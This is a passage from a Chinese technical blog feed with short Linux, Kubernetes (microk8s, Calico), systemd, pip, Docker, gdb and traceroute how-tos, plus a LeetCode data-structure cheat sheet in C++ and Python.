<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">microk8s.ctr i list | grep -vw DIGEST | grep -v ^sha256 | grep -v @sha256 | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span></span><br><span class="line">docker.io/calico/cni:v3.19.1</span><br><span class="line">docker.io/calico/kube-controllers:v3.17.3</span><br><span class="line">docker.io/calico/node:v3.19.1</span><br><span class="line">docker.io/calico/pod2daemon-flexvol:v3.19.1</span><br><span class="line">docker.io/coredns/coredns:1.8.0</span><br><span class="line">k8s.gcr.io/ingress-nginx/controller:v1.5.1</span><br><span class="line">k8s.gcr.io/metrics-server/metrics-server:v0.5.2</span><br><span class="line">k8s.gcr.io/pause:3.1</span><br><span class="line"></span><br><span class="line">microk8s.ctr i <span class="built_in">export</span> cni.tar docker.io/calico/cni:v3.19.1</span><br><span class="line">microk8s.ctr i <span class="built_in">export</span> kube-controllers.tar docker.io/calico/kube-controllers:v3.17.3</span><br><span class="line">microk8s.ctr i <span class="built_in">export</span> .....</span><br></pre></td></tr></table></figure>
<p>将image传到目标机器上并导入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">microk8s.ctr image import *.tar</span><br></pre></td></tr></table></figure>
<p>启动microk8s插件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">microk8s <span class="built_in">enable</span> dns ingress metrics-server</span><br><span class="line">microk8s status --wait-ready</span><br></pre></td></tr></table></figure>

<p>配置kubectl访问Microk8s</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">microk8s.kubectl config view --raw &gt; <span class="variable">$HOME</span>/.kube/config</span><br></pre></td></tr></table></figure>

<h2 id="卸载microk8s"><a href="#卸载microk8s" class="headerlink" title="卸载microk8s"></a>卸载microk8s</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">microk8s stop </span><br><span class="line">snap remove microk8s</span><br><span class="line"><span class="built_in">rm</span> -rf /root/.kube</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>k8s</category>
      </categories>
      <tags>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title>使用systemd启动stunnel，并设置自动重启的方法</title>
    <url>/2023/04/26/2023-04-26-use-systemd-to-start-stunnel/</url>
    <content><![CDATA[<h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><p>运行环境: Centos7</p>
<ol>
<li><p>安装stunnel </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install stunnel</span><br></pre></td></tr></table></figure>
</li>
<li><p>编写systemd配置文件，放到<code>/usr/lib/systemd/system</code></p>
</li>
</ol>
<span id="more"></span>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Stunnel Proxy Server</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">User=root</span><br><span class="line">ExecStart=/usr/bin/stunnel /etc/stunnel/stunnel.conf</span><br><span class="line">Restart=always</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>

<p>参数解释：</p>
<ul>
<li>Restart&#x3D;always 只要不是通过<code>systemctl stop</code>来停止服务，任何情况下都必须要重启服务，默认值为no</li>
</ul>
<ol start="3">
<li>启动stunnel<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl start stunnel</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="手动启动和停止stunnel的方法"><a href="#手动启动和停止stunnel的方法" class="headerlink" title="手动启动和停止stunnel的方法"></a>手动启动和停止stunnel的方法</h2><p>启动stunnel</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">stunnel /etc/stunnel/stunnel.conf</span><br></pre></td></tr></table></figure>
<p>停止stunnel</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">kill</span> `<span class="built_in">cat</span> /var/run/stunnel.pid`</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/sect-starting_stopping_restarting_stunnel">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux&#x2F;6&#x2F;html&#x2F;security_guide&#x2F;sect-starting_stopping_restarting_stunnel</a></p>
]]></content>
      <categories>
        <category>systemd</category>
      </categories>
      <tags>
        <tag>systemd</tag>
      </tags>
  </entry>
  <entry>
    <title>pip3只下载不安装以及离线安装的方法</title>
    <url>/2023/05/08/2023-05-08-how-to-download-only-with-pip3/</url>
    <content><![CDATA[<h3 id="只下载不安装"><a href="#只下载不安装" class="headerlink" title="只下载不安装"></a>只下载不安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 download kubernetes -d $&#123;folder&#125;</span><br></pre></td></tr></table></figure>
<p>如不需要下载依赖包，改用如下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 download kubernetes --no-deps on -d $&#123;folder&#125;</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h3 id="离线安装"><a href="#离线安装" class="headerlink" title="离线安装"></a>离线安装</h3><ol start="0">
<li>新增requirements.txt，内容如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">psutil</span><br><span class="line">supervisor</span><br><span class="line">kubernetes</span><br></pre></td></tr></table></figure></li>
<li>下载安装包到本地<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 download -d $&#123;folder&#125; -r /path/to/requirements.txt</span><br></pre></td></tr></table></figure></li>
<li>离线安装<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install --no-index --find-links $&#123;folder&#125; -r /path/to/requirements.txt</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>crontab执行失败返回127的原因和解决方法</title>
    <url>/2023/05/08/2023-05-08-cronjob-return-127-case/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>用<code>crontab</code>执行自己编写的Shell脚本报错，<code>iptables</code>命令返回127(command not found) ，在后台手动执行脚本是正常的。</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>添加PATH，在脚本里添加如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/usr/sbin/:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/qq_36588424/article/details/127549734">https://blog.csdn.net/qq_36588424&#x2F;article&#x2F;details&#x2F;127549734</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>troubleshooting</tag>
        <tag>crontab</tag>
      </tags>
  </entry>
  <entry>
    <title>RockyLinux9 docker中安装python2方法</title>
    <url>/2023/05/08/2023-05-08-how-to-install-py2-in-rockylinux9/</url>
    <content><![CDATA[<p>新增Dockerfile, 内容如下：</p>
<span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FROM rockylinux:9.1</span><br><span class="line"></span><br><span class="line">RUN yum -y install gcc zlib openssl openssl-devel zlib-devel wget</span><br><span class="line"></span><br><span class="line">RUN mkdir /py2 &amp;&amp; mkdir /usr/local/python2.7</span><br><span class="line"></span><br><span class="line">RUN wget -O /py2/Python-2.7.14.tgz https://www.python.org/ftp/python/2.7.14/Python-2.7.14.tgz \</span><br><span class="line">    &amp;&amp; tar -xzf /py2/Python-2.7.14.tgz -C /py2/</span><br><span class="line"></span><br><span class="line">RUN cd /py2/Python-2.7.14 &amp;&amp; ./configure --prefix=/usr/local/python2.7/ --enable-shared \</span><br><span class="line">    &amp;&amp; sed -i &#x27;219,221 s/^.//&#x27; /py2/Python-2.7.14/Modules/Setup \</span><br><span class="line">    &amp;&amp; make -j4 &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">RUN echo &quot;/lib&quot; &gt;&gt; /etc/ld.so.conf &amp;&amp; ldconfig \</span><br><span class="line">    &amp;&amp; ln -s /usr/local/python2.7/lib/libpython2.7.so.1.0 /lib/libpython2.7.so.1.0 \</span><br><span class="line">    &amp;&amp; ln -s /usr/local/python2.7/bin/python /usr/bin/python \</span><br><span class="line">    &amp;&amp; rm -rf /py2</span><br></pre></td></tr></table></figure>
<p>使用docker build命令构建镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -t [image_repo:image_tag] -f Dockerfile .</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/bcfaa5ff1cfc">https://www.jianshu.com/p/bcfaa5ff1cfc</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Microk8s calico-kube-controller not running, Failed to initialize Calico datastore error... 解决方法</title>
    <url>/2023/05/08/2023-05-08-microk8s-calico-case/</url>
    <content><![CDATA[<h2 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h2><p>Rocky Linux 9</p>
<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>microk8s calico-kube-controller pod运行失败， 报错：<code>Failed to initialize Calico datastore error=Get “https://10.152.183.1:443/apis/crd.projectcalico.org/v1/clusterinformations/default”: context deadline exceeded</code></p>
<span id="more"></span>
<h2 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h2><ul>
<li>Rocky Linux 9 iptables版本是1.8，基于nft而不是legacy。而calico插件默认使用legacy版本，导致<code>cali-INPUT</code>链没有生成</li>
<li>如果用户在INPUT链自定义了DROP&#x2F;REJECT规则, 同时<code>cali-INPUT</code>链没有生成，可能会导致k8s内部流量被丢弃，出现calico-kube-controller通过http连接apiserver超时报错.</li>
</ul>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>在calico-node中添加环境变量<code>FELIX_IPTABLESBACKEND</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">env:</span><br><span class="line"> - name: FELIX_IPTABLESBACKEND</span><br><span class="line">   value: NFT</span><br></pre></td></tr></table></figure>

<p>具体操作如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">microk8s kubectl delete -f /var/snap/microk8s/current/args/cni-network/cni.yaml</span><br><span class="line">microk8s stop</span><br><span class="line">microk8s start</span><br><span class="line"></span><br><span class="line">Edit /var/snap/microk8s/current/args/cni-network/cni.yaml</span><br><span class="line"><span class="built_in">env</span>:</span><br><span class="line"> - name: FELIX_IPTABLESBACKEND</span><br><span class="line">   value: NFT</span><br><span class="line">microk8s kubectl apply -f /var/snap/microk8s/current/args/cni-network/cni.yaml</span><br></pre></td></tr></table></figure>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://microk8s.io/docs/change-cidr">https://microk8s.io/docs/change-cidr</a><br><a href="https://zhuanlan.zhihu.com/p/590101932">https://zhuanlan.zhihu.com/p/590101932</a></p>
]]></content>
      <categories>
        <category>k8s</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title>如何设置systemd服务自动重启</title>
    <url>/2023/05/09/2023-05-09-how-to-auto-restart-service-by-systemd/</url>
    <content><![CDATA[<h2 id="设置systemd服务自动重启的方法"><a href="#设置systemd服务自动重启的方法" class="headerlink" title="设置systemd服务自动重启的方法"></a>设置systemd服务自动重启的方法</h2><p>service文件里添加如下配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Restart=always</span><br><span class="line">RestartSec=30</span><br><span class="line">StartLimitInterval=0</span><br></pre></td></tr></table></figure>
<ul>
<li>Restart&#x3D;always: 只要不是通过systemctl stop来停止服务，任何情况下都必须要重启服务，默认值为no</li>
<li>RestartSec&#x3D;30: 重启间隔，比如某次异常后，等待30(s)再进行启动，默认值0.1(s)</li>
<li>StartLimitInterval&#x3D;0: 无限次重启，默认是10秒内如果重启超过5次则不再重启，设置为0表示不限次数重启</li>
</ul>
<span id="more"></span>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>【1】<a href="https://www.freedesktop.org/software/systemd/man/systemd.service.html">https://www.freedesktop.org/software/systemd/man/systemd.service.html</a><br>【2】<a href="https://blog.csdn.net/easylife206/article/details/101730416">https://blog.csdn.net/easylife206/article/details/101730416</a></p>
]]></content>
      <categories>
        <category>systemd</category>
      </categories>
      <tags>
        <tag>systemd</tag>
      </tags>
  </entry>
  <entry>
    <title>在Docker中使用GDB调试的方法</title>
    <url>/2023/05/09/2023-05-09-how-to-use-gdb-in-docker/</url>
    <content><![CDATA[<h2 id="Docker中使用GDB调试的方法"><a href="#Docker中使用GDB调试的方法" class="headerlink" title="Docker中使用GDB调试的方法"></a>Docker中使用GDB调试的方法</h2><ol>
<li>首先在docker中安装<code>gdb</code>， 以centos为例，可以用<code>yum install gdb</code>安装</li>
<li>启动docker容器命令时，需要添加<code>--privileged</code>, <code>--cap-add=SYS_PTRACE</code>, <code>--security-opt seccomp=unconfined</code>参数， 如下<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --privileged -d -it  --cap-add=SYS_PTRACE --security-opt seccomp=unconfined [your_container_id]  bash</span><br></pre></td></tr></table></figure>
<span id="more"></span>
添加这些参数的原因参考： <a href="https://developer.aliyun.com/article/674757">为什么在Docker里使用gdb调试器会报错</a></li>
</ol>
]]></content>
      <categories>
        <category>GDB</category>
      </categories>
      <tags>
        <tag>GDB</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 常用数据结构和算法(C++)</title>
    <url>/2023/05/09/2023-05-09-leetcode-common-datastructure-and-algorithm-cplusplus/</url>
    <content><![CDATA[<h2 id="list"><a href="#list" class="headerlink" title="list"></a>list</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">list&lt;<span class="type">int</span>&gt; list;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">list::splice</span><span class="params">( iterator pos, list rhs )</span></span>;				<span class="comment">// 全部移动</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">list::splice</span><span class="params">( iterator pos, list rhs, iterator ix )</span></span>;	<span class="comment">// 移一个</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">list::splice</span><span class="params">( iterator pos, list rhs, iterator first, iterator last )</span></span>;	<span class="comment">// 移一组</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>
<h2 id="pair"><a href="#pair" class="headerlink" title="pair"></a>pair</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; v = &#123;<span class="number">1</span>, <span class="number">2</span>&#125;</span><br><span class="line">v.first</span><br><span class="line">v.second</span><br></pre></td></tr></table></figure>
<h2 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">stack&lt;<span class="type">int</span>&gt; v;</span><br></pre></td></tr></table></figure>
<h2 id="deque"><a href="#deque" class="headerlink" title="deque"></a>deque</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">deque&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; q;</span><br><span class="line">q.<span class="built_in">front</span>()</span><br><span class="line">q.<span class="built_in">back</span>()</span><br><span class="line">q.<span class="built_in">pop_front</span>()</span><br><span class="line">q.<span class="built_in">pop_back</span>()</span><br><span class="line">q.<span class="built_in">push_back</span>()</span><br><span class="line">q.<span class="built_in">push_front</span>()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line">queue = deque([<span class="string">&quot;Eric&quot;</span>, <span class="string">&quot;John&quot;</span>, <span class="string">&quot;Michael&quot;</span>])</span><br><span class="line">queue.append(<span class="string">&quot;Graham&quot;</span>)</span><br><span class="line">queue.popleft()</span><br></pre></td></tr></table></figure>
<h2 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">q.<span class="built_in">push</span>(x);</span><br><span class="line">q.<span class="built_in">front</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line">q.<span class="built_in">top</span>();</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">q=Queue(maxsize=<span class="number">5</span>)  <span class="comment"># 先进先出</span></span><br><span class="line">q=LifoQueue()		<span class="comment"># 后进先出</span></span><br><span class="line">pq=PriorityQueue()	<span class="comment"># 优先级队列</span></span><br><span class="line">p.put(i)</span><br><span class="line">p.empty()</span><br><span class="line">q.qsize()</span><br><span class="line">q.full()</span><br><span class="line">q.get()</span><br></pre></td></tr></table></figure>
<h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><figure class="highlight c++"><figcaption><span>大根堆</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">findKthLargest</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, less&lt;<span class="type">int</span>&gt;&gt; h;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        h.<span class="built_in">push</span>(nums[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        h.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h.<span class="built_in">top</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># https://blog.csdn.net/weixin_43790276/article/details/107741332</span></span><br><span class="line"><span class="keyword">import</span> heapq</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findKthLargest</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        heap = []</span><br><span class="line">        n = <span class="built_in">len</span>(nums)</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">            heapq.heappush(heap, num)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - k):</span><br><span class="line">            heapq.heappop(heap)</span><br><span class="line">        <span class="keyword">return</span> heap[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<h2 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; ht;</span><br><span class="line">ht.<span class="built_in">find</span>(key) != ht.<span class="built_in">end</span>() <span class="comment">// exist</span></span><br><span class="line">iter-&gt;<span class="built_in">first</span>()</span><br><span class="line">iter-&gt;<span class="built_in">second</span>()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dic = &#123;&#125;</span><br><span class="line"><span class="keyword">if</span> key <span class="keyword">in</span> dic:</span><br><span class="line">rows = <span class="built_in">set</span>()</span><br><span class="line">rows.add(<span class="number">1</span>)</span><br><span class="line">rows.remove(<span class="number">2</span>)</span><br><span class="line">rows.clear()</span><br></pre></td></tr></table></figure>
<h2 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="built_in">sort</span>(arr.<span class="built_in">begin</span>(), arr.<span class="built_in">end</span>());</span><br><span class="line"><span class="built_in">sort</span>(myvector.<span class="built_in">begin</span>(), myvector.<span class="built_in">begin</span>() + <span class="number">4</span>, std::<span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;());</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># intervals: List[List[int]]</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp</span>(<span class="params">listx, listy</span>):</span><br><span class="line">    <span class="keyword">if</span> listx[<span class="number">0</span>] == listy[<span class="number">0</span>]:</span><br><span class="line">        <span class="keyword">return</span> listx[<span class="number">1</span>] - listy[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> listx[<span class="number">0</span>] - listy[<span class="number">0</span>]</span><br><span class="line">intervals.sort(key=cmp_to_key(cmp))</span><br></pre></td></tr></table></figure>
<h2 id="string-sort"><a href="#string-sort" class="headerlink" title="string sort"></a>string sort</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">sorted_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">sorted</span>(strs[i]))</span><br></pre></td></tr></table></figure>
<h2 id="custom-sort"><a href="#custom-sort" class="headerlink" title="custom sort"></a>custom sort</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">bool</span> <span class="title">Cmp</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;v1, vector&lt;<span class="type">int</span>&gt; &amp;v2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (v1[<span class="number">0</span>] == v2[<span class="number">0</span>]) <span class="keyword">return</span> v1[<span class="number">1</span>] &lt; v2[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">return</span> v1[<span class="number">0</span>] &lt; v2[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sort</span>(intervals.<span class="built_in">begin</span>(), intervals.<span class="built_in">end</span>(), Cmp);</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> cmp_to_key</span><br><span class="line">lst = [(<span class="number">9</span>, <span class="number">4</span>), (<span class="number">2</span>, <span class="number">10</span>), (<span class="number">4</span>, <span class="number">3</span>), (<span class="number">3</span>, <span class="number">6</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp</span>(<span class="params">x, y</span>):</span><br><span class="line">    a = x[<span class="number">0</span>] <span class="keyword">if</span> x[<span class="number">0</span>] %<span class="number">2</span> == <span class="number">1</span> <span class="keyword">else</span> x[<span class="number">1</span>]</span><br><span class="line">    b = y[<span class="number">0</span>] <span class="keyword">if</span> y[<span class="number">0</span>] %<span class="number">2</span> == <span class="number">1</span> <span class="keyword">else</span> y[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span> a &gt; b <span class="keyword">else</span> -<span class="number">1</span> <span class="keyword">if</span> a &lt; b <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">lst.sort(key=cmp_to_key(cmp))</span><br><span class="line"><span class="built_in">print</span>(lst)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title>RPM中的config和config(noreplace)</title>
    <url>/2023/05/09/2023-05-09-what-is-config-noreplace-in-rpm/</url>
    <content><![CDATA[<p>参考：<a href="https://pureage.info/2014/04/30/noreplace-in-rpm-spec-file.html">https://pureage.info/2014/04/30/noreplace-in-rpm-spec-file.html</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>RPM</tag>
      </tags>
  </entry>
  <entry>
    <title>Traceroute简介和抓包</title>
    <url>/2023/05/15/2023-05-15-traceroute-intro-and-use/</url>
    <content><![CDATA[<h2 id="traceroute原理"><a href="#traceroute原理" class="headerlink" title="traceroute原理"></a>traceroute原理</h2><p>Traceroute 是一种网络诊断工具，用于确定数据包从一个源到达目的地所经过的路径。它通过发送一系列的数据包，并观察每个数据包经过的路由器（或称为跃点）来实现这一目的。</p>
<span id="more"></span>

<p><strong>工作原理：</strong></p>
<ul>
<li>Traceroute 发送一系列的 UDP 数据包，每个数据包都具有不同的 TTL（Time to Live）值。TTL 值表示数据包在网络中可经过的最大跃点数。</li>
<li>当第一个数据包离开源设备时，它的 TTL 值被设置为 1。当该数据包到达网络中的第一个路由器时，路由器会将 TTL 值减 1，并转发该数据包。如果 TTL 值减为 0，路由器将丢弃该数据包并向源设备发送 ICMP 时间超时报文。</li>
<li>源设备收到 ICMP 时间超时报文后，就知道了到达第一个路由器的路径。然后，源设备增加 TTL 值并发送第二个数据包，以便确定下一个路由器。</li>
<li>这个过程不断重复，每次 TTL 值增加，直到数据包到达目的地。目的设备将收到数据包并向源设备发送 ICMP 端口不可达报文，从而终止 Traceroute 进程。</li>
<li>Traceroute 将记录每个数据包的路径，包括每个跃点的 IP 地址和响应时间。最终将呈现给用户一张路由跟踪表，显示了数据包从源到目的地经过的所有路由器。</li>
</ul>
<p>总的来说，Traceroute 通过探测数据包的路径和响应时间，帮助网络管理员诊断网络连接问题，定位潜在的瓶颈或故障点。</p>
<h2 id="traceroute用法"><a href="#traceroute用法" class="headerlink" title="traceroute用法"></a>traceroute用法</h2><p>Linux系统下，traceroute用法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">traceroute hostname</span><br></pre></td></tr></table></figure>
<p>Windows系统使用tracert命令:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tracert hostname</span><br></pre></td></tr></table></figure>
<h2 id="traceroute抓包"><a href="#traceroute抓包" class="headerlink" title="traceroute抓包"></a>traceroute抓包</h2><p>在宿主机10.206.216.95上执行<code>traceroute www.baidu.com</code>，通过<code>tcpdump</code>抓包，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ifconfig ens192</span><br><span class="line">ens192: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.206.216.95  netmask 255.255.255.0  broadcast 10.206.216.255</span><br><span class="line">route</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class="line">default         gateway         0.0.0.0         UG    100    0        0 ens192</span><br><span class="line">10.206.216.0    0.0.0.0         255.255.255.0   U     100    0        0 ens192</span><br><span class="line"></span><br><span class="line"><span class="comment"># tmux pane 1</span></span><br><span class="line">$ tcpdump -i ens192 icmp and host 10.206.216.95 -w traceroute.pcap</span><br><span class="line"></span><br><span class="line"><span class="comment"># tmux pane 2</span></span><br><span class="line">$ traceroute  www.baidu.com</span><br><span class="line">traceroute to www.baidu.com (36.155.132.55), 30 hops max, 60 byte packets</span><br><span class="line"> 1  gateway (10.206.216.254)  0.239 ms  0.152 ms  0.147 ms</span><br><span class="line"> 2  10.206.2.254 (10.206.2.254)  0.265 ms  0.274 ms  0.241 ms</span><br><span class="line"> 3  192.168.200.1 (192.168.200.1)  0.545 ms  0.506 ms  0.825 ms</span><br><span class="line"> 4  36.152.113.193 (36.152.113.193)  2.837 ms  3.182 ms  3.552 ms</span><br><span class="line"> 5  221.178.162.185 (221.178.162.185)  2.632 ms * *</span><br><span class="line"> 6  * * 183.207.54.161 (183.207.54.161)  3.116 ms</span><br><span class="line"> 7  183.207.67.106 (183.207.67.106)  3.576 ms 183.207.22.130 (183.207.22.130)  3.195 ms 183.207.66.102 (183.207.66.102)  3.638 ms</span><br><span class="line"> 8  * 36.155.156.46 (36.155.156.46)  3.884 ms 36.155.156.54 (36.155.156.54)  4.690 ms</span><br><span class="line"> 9  36.155.157.174 (36.155.157.174)  4.197 ms 36.155.157.170 (36.155.157.170)  4.344 ms  3.964 ms</span><br><span class="line">10  * * *</span><br><span class="line">11  * * *</span><br><span class="line">12  * * *</span><br><span class="line">13  * * *</span><br><span class="line">14  * * *</span><br><span class="line">15  * * *</span><br><span class="line">16  * * *</span><br><span class="line">17  * * *</span><br><span class="line">18  * * *</span><br><span class="line">19  * * *</span><br><span class="line">20  * * *</span><br><span class="line">21  * * *</span><br><span class="line">22  * * *</span><br><span class="line">23  * * *</span><br><span class="line">24  * * *</span><br><span class="line">25  * * *</span><br><span class="line">26  * * *</span><br><span class="line">27  * * *</span><br><span class="line">28  * * *</span><br><span class="line">29  * * *</span><br><span class="line">30  * * *</span><br></pre></td></tr></table></figure>
<p>wireshark分析结果：<br><img src="/2023/05/15/2023-05-15-traceroute-intro-and-use/image1.png"></p>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Traceroute</tag>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows上通过git bash执行python卡住的解决方法</title>
    <url>/2023/06/26/2023-06-26-win-git-bash-fail-due-to-python/</url>
